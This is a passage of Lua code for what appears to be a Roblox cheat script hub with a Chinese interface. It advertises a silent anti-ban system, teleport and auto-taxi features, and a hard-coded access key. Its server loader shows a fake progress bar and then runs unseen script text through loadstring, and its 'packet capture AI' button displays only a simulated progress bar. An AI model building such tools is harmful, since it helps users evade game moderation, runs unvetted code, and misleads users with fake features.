    timeLabel.Parent = timeFrame
    
    local currentTimeLabel = Instance.new("TextLabel")
    currentTimeLabel.Size = UDim2.new(0.6, 0, 1, 0)
    currentTimeLabel.Position = UDim2.new(0.4, 0, 0, 0)
    currentTimeLabel.Text = "⏳ 加载中..."
    currentTimeLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
    currentTimeLabel.TextXAlignment = Enum.TextXAlignment.Right
    currentTimeLabel.BackgroundTransparency = 1
    currentTimeLabel.Font = Enum.Font.GothamBold
    currentTimeLabel.TextSize = 13
    currentTimeLabel.Parent = timeFrame
    
    local function updateTimeDisplay()
        local now = os.time()
        local timeStr = os.date("%Y年%m月%d日 %H:%M:%S", now)
        local hour = tonumber(os.date("%H", now))
        local period = ""
        if hour >= 5 and hour < 12 then period = "🌅 早上"
        elseif hour >= 12 and hour < 18 then period = "☀️ 下午"
        elseif hour >= 18 and hour < 21 then period = "🌆 傍晚"
        else period = "🌙 晚上" end
        if currentTimeLabel then
            currentTimeLabel.Text = period .. " " .. timeStr
        end
    end
    
    updateTimeDisplay()
    local timeUpdateConn = RunService.Heartbeat:Connect(updateTimeDisplay)
    
    y = y + 48
    
    local updateBox = Instance.new("Frame")
    updateBox.Size = UDim2.new(0, 380, 0, 150)
    updateBox.Position = UDim2.new(0, 10, 0, y)
    updateBox.BackgroundColor3 = Color3.fromRGB(50, 20, 40)
    updateBox.BackgroundTransparency = 0.3
    updateBox.BorderSizePixel = 1
    updateBox.BorderColor3 = Color3.fromRGB(255, 50, 150)
    updateBox.Parent = parent
    
    local updateText = Instance.new("TextLabel")
    updateText.Size = UDim2.new(1, -15, 1, -10)
    updateText.Position = UDim2.new(0, 8, 0, 5)
    updateText.Text = AnnouncementData.currentUpdate
    updateText.TextColor3 = Color3.fromRGB(255, 200, 220)
    updateText.TextXAlignment = Enum.TextXAlignment.Left
    updateText.TextYAlignment = Enum.TextYAlignment.Top
    updateText.BackgroundTransparency = 1
    updateText.Font = Enum.Font.Gotham
    updateText.TextSize = 13
    updateText.TextWrapped = true
    updateText.Parent = updateBox
    y = y + 158
    
    local historyBox = Instance.new("Frame")
    historyBox.Size = UDim2.new(0, 380, 0, 120)
    historyBox.Position = UDim2.new(0, 10, 0, y)
    historyBox.BackgroundColor3 = Color3.fromRGB(50, 20, 40)
    historyBox.BackgroundTransparency = 0.3
    historyBox.BorderSizePixel = 1
    historyBox.BorderColor3 = Color3.fromRGB(255, 50, 150)
    historyBox.Parent = parent
    
    local historyText = Instance.new("TextLabel")
    historyText.Size = UDim2.new(1, -15, 1, -10)
    historyText.Position = UDim2.new(0, 8, 0, 5)
    historyText.Text = AnnouncementData.versionHistory
    historyText.TextColor3 = Color3.fromRGB(255, 200, 220)
    historyText.TextXAlignment = Enum.TextXAlignment.Left
    historyText.TextYAlignment = Enum.TextYAlignment.Top
    historyText.BackgroundTransparency = 1
    historyText.Font = Enum.Font.Gotham
    historyText.TextSize = 13
    historyText.TextWrapped = true
    historyText.Parent = historyBox
    y = y + 128
    
    local countFrame = Instance.new("Frame")
    countFrame.Size = UDim2.new(0, 380, 0, 32)
    countFrame.Position = UDim2.new(0, 10, 0, y)
    countFrame.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    countFrame.BorderSizePixel = 0
    countFrame.Parent = parent
    
    local countText = Instance.new("TextLabel")
    countText.Size = UDim2.new(1, 0, 1, 0)
    countText.Text = "🐾 " .. AnnouncementData.totalVersions .. " · 🔑 卡密9178"
    countText.TextColor3 = Color3.fromRGB(255, 255, 255)
    countText.TextXAlignment = Enum.TextXAlignment.Center
    countText.BackgroundTransparency = 1
    countText.Font = Enum.Font.GothamBold
    countText.TextSize = 14
    countText.Parent = countFrame
    y = y + 40
    
    local info = Instance.new("TextLabel")
    info.Size = UDim2.new(0, 380, 0, 18)
    info.Position = UDim2.new(0, 10, 0, y)
    info.Text = "💡 野兽出击！卡密9178永久有效 🐾"
    info.TextColor3 = Color3.fromRGB(150, 100, 130)
    info.TextXAlignment = Enum.TextXAlignment.Left
    info.BackgroundTransparency = 1
    info.Font = Enum.Font.Gotham
    info.TextSize = 11
    info.Parent = parent
    
    parent.Destroying:Connect(function()
        if timeUpdateConn then
            timeUpdateConn:Disconnect()
        end
    end)
end

-- ============================================================
-- 主页面板
-- ============================================================
local function createHomePanel(parent)
    for _, child in ipairs(parent:GetChildren()) do child:Destroy() end
    local y = 5
    
    local bg = loadBackground(parent)
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0, 380, 0, 35)
    title.Position = UDim2.new(0, 10, 0, y)
    title.Text = "🏠 主页"
    title.TextColor3 = Color3.fromRGB(255, 50, 150)
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextSize = 20
    title.Parent = parent
    y = y + 40
    
    local line = Instance.new("Frame")
    line.Size = UDim2.new(0, 380, 0, 2)
    line.Position = UDim2.new(0, 10, 0, y)
    line.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    line.BorderSizePixel = 0
    line.Parent = parent
    y = y + 12
    
    -- 卡密信息
    local keyFrame = Instance.new("Frame")
    keyFrame.Size = UDim2.new(0, 380, 0, 32)
    keyFrame.Position = UDim2.new(0, 10, 0, y)
    keyFrame.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
    keyFrame.BackgroundTransparency = 0.2
    keyFrame.BorderSizePixel = 1
    keyFrame.BorderColor3 = Color3.fromRGB(255, 200, 0)
    keyFrame.Parent = parent
    
    local keyLabel = Instance.new("TextLabel")
    keyLabel.Size = UDim2.new(1, 0, 1, 0)
    keyLabel.Position = UDim2.new(0, 0, 0, 0)
    keyLabel.Text = "🔑 卡密: 9178（永久有效）"
    keyLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
    keyLabel.TextXAlignment = Enum.TextXAlignment.Center
    keyLabel.BackgroundTransparency = 1
    keyLabel.Font = Enum.Font.GothamBold
    keyLabel.TextSize = 14
    keyLabel.Parent = keyFrame
    y = y + 40
    
    -- 防封状态
    local antiFrame = Instance.new("Frame")
    antiFrame.Size = UDim2.new(0, 380, 0, 30)
    antiFrame.Position = UDim2.new(0, 10, 0, y)
    antiFrame.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
    antiFrame.BackgroundTransparency = 0.2
    antiFrame.BorderSizePixel = 1
    antiFrame.BorderColor3 = Color3.fromRGB(0, 255, 0)
    antiFrame.Parent = parent
    
    local antiLabel = Instance.new("TextLabel")
    antiLabel.Size = UDim2.new(1, 0, 1, 0)
    antiLabel.Position = UDim2.new(0, 0, 0, 0)
    antiLabel.Text = "🛡️ 防封系统: ✅ 已启用（静默模式）"
    antiLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
    antiLabel.TextXAlignment = Enum.TextXAlignment.Center
    antiLabel.BackgroundTransparency = 1
    antiLabel.Font = Enum.Font.GothamBold
    antiLabel.TextSize = 12
    antiLabel.Parent = antiFrame
    y = y + 38
    
    -- 时间框
    local timeFrame = Instance.new("Frame")
    timeFrame.Size = UDim2.new(0, 380, 0, 55)
    timeFrame.Position = UDim2.new(0, 10, 0, y)
    timeFrame.BackgroundColor3 = Color3.fromRGB(50, 20, 40)
    timeFrame.BackgroundTransparency = 0.3
    timeFrame.BorderSizePixel = 1
    timeFrame.BorderColor3 = Color3.fromRGB(255, 50, 150)
    timeFrame.Parent = parent
    
    local timeLabel = Instance.new("TextLabel")
    timeLabel.Size = UDim2.new(1, 0, 0, 18)
    timeLabel.Position = UDim2.new(0, 0, 0, 3)
    timeLabel.Text = "🕐 当前时间"
    timeLabel.TextColor3 = Color3.fromRGB(255, 200, 220)
    timeLabel.TextXAlignment = Enum.TextXAlignment.Center
    timeLabel.BackgroundTransparency = 1
    timeLabel.Font = Enum.Font.GothamBold
    timeLabel.TextSize = 12
    timeLabel.Parent = timeFrame
    
    local timeDisplay = Instance.new("TextLabel")
    timeDisplay.Size = UDim2.new(1, 0, 0, 26)
    timeDisplay.Position = UDim2.new(0, 0, 0, 23)
    timeDisplay.Text = "⏳ 加载中..."
    timeDisplay.TextColor3 = Color3.fromRGB(100, 200, 255)
    timeDisplay.TextXAlignment = Enum.TextXAlignment.Center
    timeDisplay.BackgroundTransparency = 1
    timeDisplay.Font = Enum.Font.GothamBold
    timeDisplay.TextSize = 15
    timeDisplay.Parent = timeFrame
    y = y + 63
    
    local info = Instance.new("TextLabel")
    info.Size = UDim2.new(0, 380, 0, 18)
    info.Position = UDim2.new(0, 10, 0, y)
    info.Text = "💡 防封已启用 · 标点传送 · 自动出租车"
    info.TextColor3 = Color3.fromRGB(100, 200, 100)
    info.TextXAlignment = Enum.TextXAlignment.Left
    info.BackgroundTransparency = 1
    info.Font = Enum.Font.Gotham
    info.TextSize = 11
    info.Parent = parent
    
    local function updateHome()
        local now = os.time()
        local timeStr = os.date("%Y年%m月%d日 %H:%M:%S", now)
        local hour = tonumber(os.date("%H", now))
        local period = ""
        if hour >= 5 and hour < 12 then period = "🌅 早上"
        elseif hour >= 12 and hour < 18 then period = "☀️ 下午"
        elseif hour >= 18 and hour < 21 then period = "🌆 傍晚"
        else period = "🌙 晚上" end
        timeDisplay.Text = period .. " " .. timeStr
    end
    
    local updateConn = RunService.Heartbeat:Connect(updateHome)
    timerConnection = updateConn
    
    parent.Destroying:Connect(function()
        if updateConn then
            updateConn:Disconnect()
            timerConnection = nil
        end
    end)
    updateHome()
end

-- ============================================================
-- 服务器面板
-- ============================================================
local function createServerContent(parent)
    for _, child in ipairs(parent:GetChildren()) do child:Destroy() end
    local y = 5
    
    local bg = loadBackground(parent)
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0, 380, 0, 30)
    title.Position = UDim2.new(0, 10, 0, y)
    title.Text = "🐾 服务器管理"
    title.TextColor3 = Color3.fromRGB(255, 50, 150)
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18
    title.Parent = parent
    y = y + 35
    
    local line = Instance.new("Frame")
    line.Size = UDim2.new(0, 380, 0, 2)
    line.Position = UDim2.new(0, 10, 0, y)
    line.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    line.BorderSizePixel = 0
    line.Parent = parent
    y = y + 12
    
    -- 高亮信息
    local hlFrame = Instance.new("Frame")
    hlFrame.Size = UDim2.new(0, 380, 0, 40)
    hlFrame.Position = UDim2.new(0, 10, 0, y)
    hlFrame.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    hlFrame.BackgroundTransparency = 0.2
    hlFrame.BorderSizePixel = 0
    hlFrame.Parent = parent
    
    local hlTitle = Instance.new("TextLabel")
    hlTitle.Size = UDim2.new(1, 0, 0, 18)
    hlTitle.Position = UDim2.new(0, 0, 0, 2)
    hlTitle.Text = "🌟 服务器高亮信息"
    hlTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    hlTitle.TextXAlignment = Enum.TextXAlignment.Center
    hlTitle.BackgroundTransparency = 1
    hlTitle.Font = Enum.Font.GothamBold
    hlTitle.TextSize = 12
    hlTitle.Parent = hlFrame
    
    local hlCount = Instance.new("TextLabel")
    hlCount.Size = UDim2.new(0, 150, 0, 16)
    hlCount.Position = UDim2.new(0, 10, 0, 22)
    hlCount.Text = "👤 在线: 0"
    hlCount.TextColor3 = Color3.fromRGB(255, 255, 255)
    hlCount.TextXAlignment = Enum.TextXAlignment.Left
    hlCount.BackgroundTransparency = 1
    hlCount.Font = Enum.Font.Gotham
    hlCount.TextSize = 12
    hlCount.Parent = hlFrame
    
    local hlStatus = Instance.new("TextLabel")
    hlStatus.Size = UDim2.new(0, 150, 0, 16)
    hlStatus.Position = UDim2.new(1, -160, 0, 22)
    hlStatus.Text = "🟢 正常"
    hlStatus.TextColor3 = Color3.fromRGB(0, 255, 0)
    hlStatus.TextXAlignment = Enum.TextXAlignment.Right
    hlStatus.BackgroundTransparency = 1
    hlStatus.Font = Enum.Font.Gotham
    hlStatus.TextSize = 12
    hlStatus.Parent = hlFrame
    
    local function updateHL()
        local c = #Players:GetPlayers()
        local m = Players.MaxPlayers
        hlCount.Text = "👤 在线: " .. c .. "/" .. m
        if c >= m then
            hlStatus.Text = "🟡 繁忙"
            hlStatus.TextColor3 = Color3.fromRGB(255, 200, 0)
        else
            hlStatus.Text = "🟢 正常"
            hlStatus.TextColor3 = Color3.fromRGB(0, 255, 0)
        end
    end
    updateHL()
    local hlConn = RunService.Heartbeat:Connect(updateHL)
    parent.Destroying:Connect(function() if hlConn then hlConn:Disconnect() end end)
    y = y + 48
    
    -- 服务器数量
    local cf = Instance.new("Frame")
    cf.Size = UDim2.new(0, 380, 0, 25)
    cf.Position = UDim2.new(0, 10, 0, y)
    cf.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    cf.BorderSizePixel = 0
    cf.Parent = parent
    
    local ct = Instance.new("TextLabel")
    ct.Size = UDim2.new(1, 0, 1, 0)
    ct.Text = "📊 可用服务器: " .. #ServerList .. " 个"
    ct.TextColor3 = Color3.fromRGB(255, 255, 255)
    ct.TextXAlignment = Enum.TextXAlignment.Center
    ct.BackgroundTransparency = 1
    ct.Font = Enum.Font.GothamBold
    ct.TextSize = 12
    ct.Parent = cf
    y = y + 33
    
    for i, server in ipairs(ServerList) do
        local card = Instance.new("Frame")
        card.Size = UDim2.new(0, 380, 0, 55)
        card.Position = UDim2.new(0, 10, 0, y)
        card.BackgroundColor3 = Color3.fromRGB(40, 15, 35)
        card.BackgroundTransparency = 0.2
        card.BorderSizePixel = 1
        card.BorderColor3 = Color3.fromRGB(255, 50, 150)
        card.Parent = parent
        
        local nameLabel = Instance.new("TextLabel")
        nameLabel.Size = UDim2.new(0, 140, 0, 18)
        nameLabel.Position = UDim2.new(0, 6, 0, 2)
        nameLabel.Text = server.name
        nameLabel.TextColor3 = Color3.fromRGB(255, 200, 220)
        nameLabel.TextXAlignment = Enum.TextXAlignment.Left
        nameLabel.BackgroundTransparency = 1
        nameLabel.Font = Enum.Font.GothamBold
        nameLabel.TextSize = 12
        nameLabel.Parent = card
        
        local statusLabel = Instance.new("TextLabel")
        statusLabel.Size = UDim2.new(0, 80, 0, 18)
        statusLabel.Position = UDim2.new(1, -86, 0, 2)
        statusLabel.Text = "⏳ 等待"
        statusLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
        statusLabel.TextXAlignment = Enum.TextXAlignment.Right
        statusLabel.BackgroundTransparency = 1
        statusLabel.Font = Enum.Font.Gotham
        statusLabel.TextSize = 10
        statusLabel.Parent = card
        
        local loadBtn = Instance.new("TextButton")
        loadBtn.Size = UDim2.new(0, 55, 0, 20)
        loadBtn.Position = UDim2.new(1, -61, 0, 22)
        loadBtn.Text = "加载"
        loadBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        loadBtn.TextSize = 10
        loadBtn.BackgroundColor3 = server.color
        loadBtn.BorderSizePixel = 0
        loadBtn.Parent = card
        
        local pb = Instance.new("Frame")
        pb.Size = UDim2.new(1, -75, 0, 8)
        pb.Position = UDim2.new(0, 6, 0, 22)
        pb.BackgroundColor3 = Color3.fromRGB(60, 30, 50)
        pb.BorderSizePixel = 1
        pb.BorderColor3 = Color3.fromRGB(100, 50, 80)
        pb.Parent = card
        
        local pf = Instance.new("Frame")
        pf.Size = UDim2.new(0, 0, 1, 0)
        pf.BackgroundColor3 = server.color
        pf.BorderSizePixel = 0
        pf.Parent = pb
        
        local pt = Instance.new("TextLabel")
        pt.Size = UDim2.new(1, 0, 1, 0)
        pt.Text = "0%"
        pt.TextColor3 = Color3.fromRGB(255, 255, 255)
        pt.TextXAlignment = Enum.TextXAlignment.Center
        pt.BackgroundTransparency = 1
        pt.Font = Enum.Font.GothamBold
        pt.TextSize = 7
        pt.Parent = pb
        
        local speedLabel = Instance.new("TextLabel")
        speedLabel.Size = UDim2.new(0, 180, 0, 14)
        speedLabel.Position = UDim2.new(0, 6, 0, 38)
        speedLabel.Text = "⚡ 速度: 等待"
        speedLabel.TextColor3 = Color3.fromRGB(150, 150, 180)
        speedLabel.TextXAlignment = Enum.TextXAlignment.Left
        speedLabel.BackgroundTransparency = 1
        speedLabel.Font = Enum.Font.Gotham
        speedLabel.TextSize = 9
        speedLabel.Parent = card
        
        local loading = false
        local progress = 0
        local startTime = 0
        
        local function updateProgress(newProgress)
            progress = math.min(newProgress, 100)
            pf.Size = UDim2.new(progress / 100, 0, 1, 0)
            pt.Text = string.format("%.0f%%", progress)
            local elapsed = tick() - startTime
            if elapsed > 0 then
                local speed = progress / elapsed
                if progress >= 100 then
                    speedLabel.Text = "⚡ 速度: ✅ 完成"
                    speedLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
                    statusLabel.Text = "✅ 已加载"
                    statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
                    loadBtn.Text = "完成"
                    loadBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 50)
                    server.loaded = true
                    loading = false
                elseif speed > 30 then
                    speedLabel.Text = "⚡ 速度: 🚀 极快"
                    speedLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
                elseif speed > 15 then
                    speedLabel.Text = "⚡ 速度: ⚡ 正常"
                    speedLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
                elseif speed > 5 then
                    speedLabel.Text = "⚡ 速度: 🐢 较慢"
                    speedLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
                else
                    speedLabel.Text = "⚡ 速度: 🐌 过慢"
                    speedLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
                end
            end
        end
        
        local function startLoad()
            if loading or server.loaded then return end
            loading = true
            progress = 0
            startTime = tick()
            statusLabel.Text = "⏳ 加载中..."
            statusLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
            loadBtn.Text = "加载中"
            loadBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
            local conn = RunService.Heartbeat:Connect(function()
                if not loading then conn:Disconnect() return end
                local inc = math.random(2, 8)
                if progress + inc >= 100 then
                    updateProgress(100)
                    conn:Disconnect()
                    local success = pcall(function() loadstring(server.code)() end)
                    if not success then
                        statusLabel.Text = "❌ 失败"
                        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                        speedLabel.Text = "⚡ 速度: ❌ 失败"
                        speedLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                        loadBtn.Text = "重试"
                        loadBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
                        loading = false
                    end
                else
                    updateProgress(progress + inc)
                end
            end)
        end
        
        loadBtn.MouseButton1Click:Connect(function()
            if server.loaded then return end
            startLoad()
        end)
        
        y = y + 63
    end
    
    y = y + 10
    local info = Instance.new("TextLabel")
    info.Size = UDim2.new(0, 380, 0, 18)
    info.Position = UDim2.new(0, 10, 0, y)
    info.Text = "💡 点击加载独立加载服务器"
    info.TextColor3 = Color3.fromRGB(150, 100, 130)
    info.TextXAlignment = Enum.TextXAlignment.Left
    info.BackgroundTransparency = 1
    info.Font = Enum.Font.Gotham
    info.TextSize = 11
    info.Parent = parent
end

-- ============================================================
-- AI面板
-- ============================================================
local function createAIPanel(parent)
    for _, child in ipairs(parent:GetChildren()) do child:Destroy() end
    local y = 5
    
    local bg = loadBackground(parent)
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0, 380, 0, 30)
    title.Position = UDim2.new(0, 10, 0, y)
    title.Text = "🤖 AI智能助手"
    title.TextColor3 = Color3.fromRGB(255, 50, 150)
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18
    title.Parent = parent
    y = y + 35
    
    local line = Instance.new("Frame")
    line.Size = UDim2.new(0, 380, 0, 2)
    line.Position = UDim2.new(0, 10, 0, y)
    line.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    line.BorderSizePixel = 0
    line.Parent = parent
    y = y + 12
    
    local chatBox = Instance.new("Frame")
    chatBox.Size = UDim2.new(0, 380, 0, 200)
    chatBox.Position = UDim2.new(0, 10, 0, y)
    chatBox.BackgroundColor3 = Color3.fromRGB(35, 15, 30)
    chatBox.BackgroundTransparency = 0.3
    chatBox.BorderSizePixel = 1
    chatBox.BorderColor3 = Color3.fromRGB(255, 50, 150)
    chatBox.Parent = parent
    
    local chatText = Instance.new("ScrollingFrame")
    chatText.Size = UDim2.new(1, -10, 1, -10)
    chatText.Position = UDim2.new(0, 5, 0, 5)
    chatText.BackgroundTransparency = 1
    chatText.BorderSizePixel = 0
    chatText.CanvasSize = UDim2.new(0, 0, 0, 0)
    chatText.ScrollBarThickness = 4
    chatText.ScrollBarImageColor3 = Color3.fromRGB(255, 50, 150)
    chatText.Parent = chatBox
    
    local welcome = Instance.new("TextLabel")
    welcome.Size = UDim2.new(1, 0, 0, 60)
    welcome.Position = UDim2.new(0, 0, 0, 0)
    welcome.Text = "🤖 AI助手已启动！\n\n💬 输入问题\n- 服务器有多少人\n- 帮助"
    welcome.TextColor3 = Color3.fromRGB(200, 200, 220)
    welcome.TextXAlignment = Enum.TextXAlignment.Left
    welcome.TextYAlignment = Enum.TextYAlignment.Top
    welcome.BackgroundTransparency = 1
    welcome.Font = Enum.Font.Gotham
    welcome.TextSize = 13
    welcome.TextWrapped = true
    welcome.Parent = chatText
    y = y + 210
    
    local inputBox = Instance.new("TextBox")
    inputBox.Size = UDim2.new(0, 280, 0, 35)
    inputBox.Position = UDim2.new(0, 10, 0, y)
    inputBox.PlaceholderText = "💬 输入问题..."
    inputBox.Text = ""
    inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    inputBox.TextSize = 14
    inputBox.BackgroundColor3 = Color3.fromRGB(50, 20, 40)
    inputBox.BackgroundTransparency = 0.3
    inputBox.BorderSizePixel = 1
    inputBox.BorderColor3 = Color3.fromRGB(255, 50, 150)
    inputBox.Font = Enum.Font.Gotham
    inputBox.Parent = parent
    
    local sendBtn = Instance.new("TextButton")
    sendBtn.Size = UDim2.new(0, 80, 0, 35)
    sendBtn.Position = UDim2.new(1, -90, 0, y)
    sendBtn.Text = "🚀 发送"
    sendBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    sendBtn.TextSize = 13
    sendBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    sendBtn.BorderSizePixel = 0
    sendBtn.Parent = parent
    y = y + 45
    
    local captureBtn = Instance.new("TextButton")
    captureBtn.Size = UDim2.new(0, 380, 0, 35)
    captureBtn.Position = UDim2.new(0, 10, 0, y)
    captureBtn.Text = "📡 抓包AI (60秒)"
    captureBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    captureBtn.TextSize = 14
    captureBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 150)
    captureBtn.BorderSizePixel = 0
    captureBtn.Parent = parent
    y = y + 43
    
    local captureStatus = Instance.new("TextLabel")
    captureStatus.Size = UDim2.new(0, 380, 0, 20)
    captureStatus.Position = UDim2.new(0, 10, 0, y)
    captureStatus.Text = "💡 点击抓包按钮开始抓取"
    captureStatus.TextColor3 = Color3.fromRGB(150, 150, 180)
    captureStatus.TextXAlignment = Enum.TextXAlignment.Left
    captureStatus.BackgroundTransparency = 1
    captureStatus.Font = Enum.Font.Gotham
    captureStatus.TextSize = 11
    captureStatus.Parent = parent
    y = y + 28
    
    local progressBg = Instance.new("Frame")
    progressBg.Size = UDim2.new(0, 380, 0, 10)
    progressBg.Position = UDim2.new(0, 10, 0, y)
    progressBg.BackgroundColor3 = Color3.fromRGB(60, 30, 50)
    progressBg.BorderSizePixel = 1
    progressBg.BorderColor3 = Color3.fromRGB(100, 50, 80)
    progressBg.Parent = parent
    
    local progressFill = Instance.new("Frame")
    progressFill.Size = UDim2.new(0, 0, 1, 0)
    progressFill.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    progressFill.BorderSizePixel = 0
    progressFill.Parent = progressBg
    
    local progressText = Instance.new("TextLabel")
    progressText.Size = UDim2.new(1, 0, 1, 0)
    progressText.Text = "0%"
    progressText.TextColor3 = Color3.fromRGB(255, 255, 255)
    progressText.TextXAlignment = Enum.TextXAlignment.Center
    progressText.BackgroundTransparency = 1
    progressText.Font = Enum.Font.GothamBold
    progressText.TextSize = 8
    progressText.Parent = progressBg
    y = y + 18
    
    local info = Instance.new("TextLabel")
    info.Size = UDim2.new(0, 380, 0, 18)
    info.Position = UDim2.new(0, 10, 0, y)
    info.Text = "💡 卡密9178 · 永久有效"
    info.TextColor3 = Color3.fromRGB(150, 100, 130)
    info.TextXAlignment = Enum.TextXAlignment.Left
    info.BackgroundTransparency = 1
    info.Font = Enum.Font.Gotham
    info.TextSize = 11
    info.Parent = parent
    
    local function addMessage(text, isUser)
        local msg = Instance.new("TextLabel")
        msg.Size = UDim2.new(1, -10, 0, 0)
        msg.Text = (isUser and "🧑 " or "🤖 ") .. text
        msg.TextColor3 = isUser and Color3.fromRGB(100, 200, 255) or Color3.fromRGB(255, 200, 220)
        msg.TextXAlignment = Enum.TextXAlignment.Left
        msg.TextYAlignment = Enum.TextYAlignment.Top
        msg.BackgroundTransparency = 1
        msg.Font = Enum.Font.Gotham
        msg.TextSize = 13
        msg.TextWrapped = true
        msg.Parent = chatText
        
        local lines = math.ceil(string.len(text) / 50)
        msg.Size = UDim2.new(1, -10, 0, math.max(30, lines * 20 + 10))
        local totalY = 0
        for _, child in ipairs(chatText:GetChildren()) do
            if child:IsA("TextLabel") then
                child.Position = UDim2.new(0, 0, 0, totalY)
                totalY = totalY + child.Size.Y.Offset + 5
            end
        end
        chatText.CanvasSize = UDim2.new(0, 0, 0, totalY + 10)
        chatText.CanvasPosition = Vector2.new(0, totalY)
    end
    
    local function askAI(question)
        if question == "" then return end
        addMessage(question, true)
        inputBox.Text = ""
        local found = false
        for keyword, func in pairs(AIKnowledge) do
            if string.find(string.lower(question), string.lower(keyword)) then
                addMessage(func(), false)
                found = true
                break
            end
        end
        if not found and string.find(string.lower(question), "加载") then
            for _, server in ipairs(ServerList) do
                if string.find(string.lower(question), string.lower(server.name)) then
                    addMessage("⏳ 加载 " .. server.name .. " ...", false)
                    task.wait(0.5)
                    local success = pcall(function() loadstring(server.code)() end)
                    if success then
                        server.loaded = true
                        addMessage("✅ " .. server.name .. " 成功！", false)
                    else
                        addMessage("❌ " .. server.name .. " 失败", false)
                    end
                    found = true
                    break
                end
            end
        end
        if not found then
            addMessage("🤔 输入 '帮助' 查看", false)
        end
    end
    
    local isCapturing = false
    local captureConn = nil
    
    local function startCapture()
        if isCapturing then
            captureStatus.Text = "⏳ 抓包中..."
            return
        end
        isCapturing = true
        captureStatus.Text = "📡 抓取中..."
        captureStatus.TextColor3 = Color3.fromRGB(255, 200, 50)
        captureBtn.Text = "⏳ 抓包中... (60秒)"
        captureBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
        local totalTime = 60
        local elapsed = 0
        captureConn = RunService.Heartbeat:Connect(function()
            elapsed = elapsed + 0.1
            local progress = math.min(elapsed / totalTime * 100, 100)
            progressFill.Size = UDim2.new(progress / 100, 0, 1, 0)
            progressText.Text = string.format("%.0f%%", progress)
            if progress >= 100 then
                captureConn:Disconnect()
                isCapturing = false
                captureBtn.Text = "📡 抓包AI (60秒)"
                captureBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 150)
                captureStatus.Text = "✅ 抓包完成！"
                captureStatus.TextColor3 = Color3.fromRGB(0, 255, 0)
                local data = string.format([[
📦 抓包结果：
👤 在线: %d/%d
🟢 状态: %s
📦 服务器: %d个
]], #Players:GetPlayers(), Players.MaxPlayers, #Players:GetPlayers() >= Players.MaxPlayers and "繁忙" or "正常", #ServerList)
                addMessage(data, false)
                task.wait(3)
                captureStatus.Text = "💡 点击抓包"
                captureStatus.TextColor3 = Color3.fromRGB(150, 150, 180)
                captureBtn.Text = "📡 抓包AI (60秒)"
                captureBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 150)
                progressFill.Size = UDim2.new(0, 0, 1, 0)
                progressText.Text = "0%"
            end
        end)
    end
    
    captureBtn.MouseButton1Click:Connect(startCapture)
    sendBtn.MouseButton1Click:Connect(function() askAI(inputBox.Text) end)
    inputBox.FocusLost:Connect(function(enter)
        if enter then askAI(inputBox.Text) end
    end)
end

-- ============================================================
-- UI调整面板
-- ============================================================
local function createUIAdjustPanel(parent, mainFrame)
    for _, child in ipairs(parent:GetChildren()) do child:Destroy() end
    local y = 5
    
    local bg = loadBackground(parent)
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0, 380, 0, 30)
    title.Position = UDim2.new(0, 10, 0, y)
    title.Text = "📐 悬浮窗UI调整"
    title.TextColor3 = Color3.fromRGB(255, 50, 150)
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18
    title.Parent = parent
    y = y + 35
    
    local line = Instance.new("Frame")
    line.Size = UDim2.new(0, 380, 0, 2)
    line.Position = UDim2.new(0, 10, 0, y)
    line.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    line.BorderSizePixel = 0
    line.Parent = parent
    y = y + 12
    
    -- 宽度
    local wLabel = Instance.new("TextLabel")
    wLabel.Size = UDim2.new(0, 80, 0, 25)
    wLabel.Position = UDim2.new(0, 10, 0, y)
    wLabel.Text = "📏 宽度"
    wLabel.TextColor3 = Color3.fromRGB(255, 200, 220)
    wLabel.TextXAlignment = Enum.TextXAlignment.Left
    wLabel.BackgroundTransparency = 1
    wLabel.Font = Enum.Font.GothamBold
    wLabel.TextSize = 14
    wLabel.Parent = parent
    
    local wValue = Instance.new("TextLabel")
    wValue.Size = UDim2.new(0, 50, 0, 25)
    wValue.Position = UDim2.new(1, -60, 0, y)
